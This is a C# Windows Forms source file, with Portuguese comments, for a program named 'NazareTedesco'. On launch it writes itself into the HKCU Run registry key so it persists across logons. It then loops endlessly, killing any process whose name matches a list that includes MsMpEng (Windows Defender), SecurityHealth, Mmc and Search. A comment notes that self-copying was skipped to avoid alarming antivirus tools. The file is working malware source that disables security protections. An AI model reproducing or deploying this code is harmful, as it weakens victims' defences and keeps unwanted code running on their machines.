using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace NazareTedesco
{
    public partial class Form1 : Form
    {

        public void mataProcesso(string nome)
        {
            try
            {
               
                Process[] processosArray = Process.GetProcesses();
                foreach (Process processo in processosArray)
                {
                    if (processo.ProcessName.Contains(nome)){
                        processo.Kill();
                    }
                }
            }
            catch (Exception ex)
            {
                // Não é pra mostrar nada na verdade
                Console.WriteLine("Erro ao matar::::::::"+ex.ToString() );
            }
        }

        public void mataProcessos(string[] programas)
        {
            foreach (string programa in programas)
            {
                mataProcesso(programa);
            }

        }

        public string getMe()
        {
            return Process.GetCurrentProcess().MainModule.FileName;
        }

        public void autoExecutaPorRegistro()
        {
            try
            {
                Microsoft.Win32.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "NazareTedesco", getMe());
            }
            catch (Exception ex)
            {
                Console.WriteLine("Erro " + ex);
            }
        }

        public void main()
        {
            // Nome dos processos é case sensitive, coloque aqui na lista os processos de executaveis chatos
            string[] programas = { "Mmc", "Tempo Ocioso do Sistema", "MsMpEng", "Search", "RuntimeBroker", "SecurityHealth", "msedgewebview2"};

            // Fazer quando o pc for iniciado, o mesmo arquivo ser chamado, não fiz copiar pois os antivirus iriam ficar em polvorosa
            autoExecutaPorRegistro();

            // fica matando
            while (true)
            {
                mataProcessos(programas);
                Thread.Sleep(600);
            }
        }


        public Form1()
        {


            main();
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}